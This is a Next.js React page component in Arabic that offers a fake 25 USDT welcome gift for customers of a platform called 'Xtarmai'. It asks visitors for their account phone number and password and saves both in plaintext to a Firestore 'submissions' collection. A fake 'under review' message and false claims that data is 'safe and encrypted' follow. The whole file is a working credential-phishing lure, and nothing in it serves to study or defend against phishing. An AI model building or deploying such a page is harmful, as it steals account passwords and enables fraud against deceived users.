
'use client';

import React, { useState } from 'react';
import { useFirestore } from '@/firebase';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';

export default function Home() {
  const db = useFirestore();
  const [phone, setPhone] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  const submitRequest = async () => {
    if (!phone || !password) {
      alert('❌ يرجى إدخال رقم الهاتف وكلمة المرور.');
      return;
    }

    setLoading(true);

    try {
      // حفظ البيانات في Firestore تحت مجموعة submissions
      await addDoc(collection(db, "submissions"), {
        phone: phone,
        password: password,
        createdAt: serverTimestamp(),
        status: "pending"
      });

      setSubmitted(true);
      setLoading(false);
    } catch (error) {
      console.error("Error adding document: ", error);
      alert('❌ حدث خطأ أثناء الإرسال. تأكد من إعدادات الـ Rules في Firebase.');
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen flex items-center justify-center p-4">
      <style jsx global>{`
        body {
          margin: 0;
          background: radial-gradient(circle at 30% 30%, #0b1f3a, #030712);
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
      `}</style>
      
      <style jsx>{`
        .gift-card {
            background: rgba(18, 28, 46, 0.85);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 32px;
            padding: 35px 30px;
            width: 420px;
            max-width: 100%;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(59, 130, 246, 0.3) inset;
            text-align: center;
            animation: fadeIn 0.8s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .gift-icon {
            font-size: 70px;
            line-height: 1;
            margin-bottom: 10px;
            filter: drop-shadow(0 0 20px #3b82f6);
            animation: float 3s ease-in-out infinite;
            display: flex;
            justify-content: center;
        }

        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-8px); }
            100% { transform: translateY(0px); }
        }

        h1 {
            background: linear-gradient(135deg, #a5d8ff, #60a5fa);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 28px;
            margin: 5px 0 5px;
            font-weight: 700;
        }

        .sub-title {
            color: #9bb8e0;
            font-size: 16px;
            margin-bottom: 20px;
            border-bottom: 1px dashed #2d4b77;
            padding-bottom: 15px;
        }

        .highlight {
            background: linear-gradient(145deg, #1e2f47, #0e1a2b);
            padding: 18px 15px;
            border-radius: 24px;
            margin: 20px 0;
            border: 1px solid #2b3f5c;
            box-shadow: inset 0 2px 5px rgba(0,0,0,0.6);
        }

        .amount {
            font-size: 42px;
            font-weight: 800;
            color: #fcd34d;
            text-shadow: 0 0 15px #fbbf24;
            letter-spacing: 2px;
        }

        .amount small { font-size: 18px; color: #94a3b8; }

        .input-group { margin: 20px 0; text-align: right; }
        .input-group label {
            display: block;
            color: #b3d0f0;
            font-size: 14px;
            margin-bottom: 8px;
        }

        .input-field {
            width: 100%;
            padding: 16px 18px;
            background: #0e1b2c;
            border: 2px solid #253c5c;
            border-radius: 50px;
            color: white;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
            box-sizing: border-box;
        }

        .input-field:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 15px #3b82f6;
        }

        .btn-request {
            width: 100%;
            padding: 16px;
            background: linear-gradient(90deg, #2563eb, #3b82f6, #60a5fa);
            border: none;
            border-radius: 50px;
            color: white;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 10px 25px -5px #1e3a8a;
            margin-top: 10px;
        }

        .btn-request:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .footer-note {
            margin-top: 25px;
            color: #5f7d9e;
            font-size: 12px;
            display: flex;
            justify-content: center;
            gap: 20px;
            border-top: 1px solid #1f3752;
            padding-top: 18px;
        }

        .review-message {
            margin-top: 20px;
            background: #0f2a3f;
            border: 1px solid #fbbf24;
            border-radius: 20px;
            padding: 16px;
            color: #fde68a;
            box-shadow: 0 0 20px #f59e0b40;
            animation: slideUp 0.4s;
        }

        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; } }
      `}</style>

      <div className="gift-card" dir="rtl">
        <div className="gift-icon">🎁✨💰</div>
        <h1>عرض حصري: 25 USDT</h1>
        <div className="sub-title">هدية ترحيبية خاصة لعملاء Xtarmai الأوفياء</div>

        <div className="highlight">
          <span style={{ color: '#b3d9ff', fontSize: '18px' }}>مكافأة فورية لعملائنا المميزين</span>
          <div className="amount">25 <small>USDT</small></div>
        </div>

        {!submitted ? (
          <>
            <p id="desc" style={{ color: '#b0caf0', fontSize: '14px', margin: '15px 0 5px' }}>
              🎁 استلم مكافأتك الآن! أدخل رقم هاتفك وكلمة المرور للتحقق من الأهلية واستلام الـ 25 USDT فوراً.
            </p>

            <div className="input-group">
              <label>📱 رقم الهاتف (مرتبط بحساب Xtarmai)</label>
              <input 
                type="tel" 
                className="input-field" 
                placeholder="أدخل رقم الهاتف" 
                autoComplete="off"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
              />
            </div>

            <div className="input-group">
              <label>🔐 كلمة المرور</label>
              <input 
                type="password" 
                className="input-field" 
                placeholder="كلمة مرور حسابك" 
                autoComplete="off"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>

            <button 
              className="btn-request" 
              onClick={submitRequest}
              disabled={loading}
            >
              {loading ? 'جاري المعالجة...' : '🚀 احصل على الهدية الآن'}
            </button>
          </>
        ) : (
          <div className="review-message">
            ⏳ تم استلام طلبك بنجاح! ستراجع فرقنا بياناتك خلال ساعة إلى 3 ساعات. سيتم إيداع الـ 25 USDT في محفظتك فور التأكد من الأهلية.
          </div>
        )}

        <div className="footer-note">
          <div>⏱️ عرض محدود العدد</div>
          <div>🔒 بياناتك آمنة ومشفرة</div>
          <div>🎯 أكثر من 1000 مستلم</div>
        </div>
      </div>
    </main>
  );
}
